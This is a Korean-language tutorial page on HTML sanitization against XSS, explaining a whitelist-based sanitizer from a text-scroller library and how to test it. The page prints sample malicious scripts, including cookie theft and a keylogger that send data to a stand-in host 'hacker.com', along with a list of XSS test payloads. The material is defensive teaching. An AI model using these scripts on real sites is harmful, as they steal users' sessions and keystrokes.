---
render_with_liquid: false
layout: page
---

{% raw %}
# HTML 새니타이징(Sanitization) - XSS 공격 방어

## 개요

HTML 새니타이징은 사용자 입력이나 외부 데이터에서 위험한 HTML/JavaScript 코드를 제거하거나 무력화하여 XSS(Cross-Site Scripting) 공격을 방지하는 보안 기법입니다.

## 문제: XSS(Cross-Site Scripting) 공격

웹 애플리케이션에서 사용자가 제공한 HTML을 그대로 렌더링하면 악의적인 스크립트가 실행될 수 있습니다.

```javascript
// 위험한 코드
element.innerHTML = userInput; // userInput에 <script>alert('hacked')</script> 포함 가능
```

### 악의적인 스크립트란?

사용자의 의도와 무관하게 해를 끼치는 JavaScript 코드입니다.

```javascript
// 1. 쿠키 탈취 (세션 하이재킹)
<script>
  fetch('http://hacker.com?cookie=' + document.cookie)
</script>

// 2. 계정 정보 변경
<script>
  fetch('/api/change-email', {
    method: 'POST',
    body: JSON.stringify({email: 'hacker@evil.com'})
  })
</script>

// 3. 키로깅 (입력 정보 훔치기)
<script>
  document.addEventListener('keypress', e => {
    fetch('http://hacker.com?key=' + e.key)
  })
</script>

// 4. 피싱 페이지 삽입
<script>
  document.body.innerHTML = '<form>로그인: <input type="password"></form>'
</script>
```

이런 스크립트가 게시글, 댓글 등 사용자 입력을 통해 웹사이트에 삽입되면, 그 페이지를 보는 다른 사용자들의 브라우저에서 실행되어 정보를 탈취하거나 부정한 행위를 수행합니다.

## 해결: HTML 새니타이징

### 구현 방법

infinite-text-scroller 라이브러리의 구현 예시 (`src/index.js:45-84`):

```javascript
static #sanitizeHTML = (html) => {
  // 1. 허용할 태그 목록 정의
  const allowedTags = ['b', 'strong', 'i', 'em', 'u', 'span', 'br', 'mark'];
  const allowedAttrs = ['style', 'class'];

  // 2. 임시 DOM 요소에 HTML 파싱
  const temp = document.createElement('div');
  temp.innerHTML = html;

  // 3. TreeWalker로 모든 요소 순회
  const walker = document.createTreeWalker(
    temp,
    NodeFilter.SHOW_ELEMENT,
    null,
    false
  );

  const nodesToRemove = [];
  let node;

  while (node = walker.nextNode()) {
    const tagName = node.tagName.toLowerCase();

    // 4. 허용되지 않은 태그 제거 대상에 추가
    if (!allowedTags.includes(tagName)) {
      nodesToRemove.push(node);
      continue;
    }

    // 5. 허용되지 않은 속성 제거
    const attrs = Array.from(node.attributes);
    attrs.forEach(attr => {
      if (!allowedAttrs.includes(attr.name.toLowerCase())) {
        node.removeAttribute(attr.name);
      }
    });
  }

  // 6. 위험한 태그를 텍스트 노드로 치환
  nodesToRemove.forEach(node => {
    const text = document.createTextNode(node.textContent);
    node.parentNode.replaceChild(text, node);
  });

  return temp.innerHTML;
};
```

### 주요 원리

1. **화이트리스트 방식**: 안전한 태그/속성만 허용 (블랙리스트보다 안전)
2. **DOM 파싱**: 브라우저의 HTML 파서를 활용하여 정확한 파싱
3. **TreeWalker 활용**: 모든 요소를 체계적으로 순회
4. **위험 요소 치환**: 제거 대신 텍스트 노드로 변환 (컨텐츠 보존)

### 사용 예시

```javascript
// 라이브러리 내부에서 사용 (src/index.js:131)
if (config.html) {
  textSpan.innerHTML = InfiniteTextScroller.#sanitizeHTML(config.html);
} else {
  textSpan.textContent = text;
}

// updateHtml 메서드에서도 사용 (src/index.js:452)
const sanitized = InfiniteTextScroller.#sanitizeHTML(newHtml);
```

## 실전 적용 시나리오

### ❌ 위험한 입력

```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<a href="javascript:alert('XSS')">Click</a>
```

### ✅ 새니타이징 후

```html
alert('XSS')
x
Click
```

위험한 태그와 속성이 제거되고 텍스트만 남습니다.

### ✅ 안전한 입력

```html
<strong>중요</strong> 내용입니다 <em>강조</em>
<span style="color: red;">빨간 텍스트</span>
```

허용된 태그와 속성은 그대로 유지됩니다.

## 보안 고려사항

### 1. 화이트리스트 관리

```javascript
// 필요 최소한의 태그만 허용
const allowedTags = ['b', 'strong', 'i', 'em', 'u', 'span', 'br', 'mark'];

// onclick, onerror 등 이벤트 핸들러 속성 차단
const allowedAttrs = ['style', 'class']; // href, src 제외
```

### 2. CSS 인젝션 방지

현재 구현은 `style` 속성을 허용하지만, 더 강력한 보안이 필요한 경우:

```javascript
// CSS 속성 값 검증
if (attr.name === 'style') {
  const dangerousPatterns = /expression|javascript|behavior/i;
  if (dangerousPatterns.test(attr.value)) {
    node.removeAttribute('style');
  }
}
```

### 3. textContent vs innerHTML

```javascript
// 안전: 모든 입력을 텍스트로 처리
element.textContent = userInput;

// 주의: HTML 파싱 (새니타이징 필수)
element.innerHTML = sanitizeHTML(userInput);
```

## 대안 방법

### 1. DOMPurify 라이브러리

```javascript
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirty);
```

### 2. 템플릿 리터럴 (안전)



```javascript
// React, Vue 등의 프레임워크는 자동 이스케이핑
<div>{userInput}</div> // XSS 안전
<div dangerouslySetInnerHTML={{__html: sanitize(userInput)}} /> // 명시적 표시
```



## 테스트 방법

```javascript
// XSS 페이로드 테스트
const payloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<iframe src=javascript:alert(1)>',
  '"><script>alert(1)</script>'
];

payloads.forEach(payload => {
  const result = sanitizeHTML(payload);
  console.assert(!result.includes('<script'), 'Script tag not removed!');
  console.assert(!result.includes('onerror='), 'Event handler not removed!');
});
```

## 참고 자료

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [MDN: TreeWalker](https://developer.mozilla.org/en-US/docs/Web/API/TreeWalker)
- infinite-text-scroller 구현: `/Users/a220330001/Git/Personal/infinite-text-scroller/src/index.js:45-84`
{% endraw %}
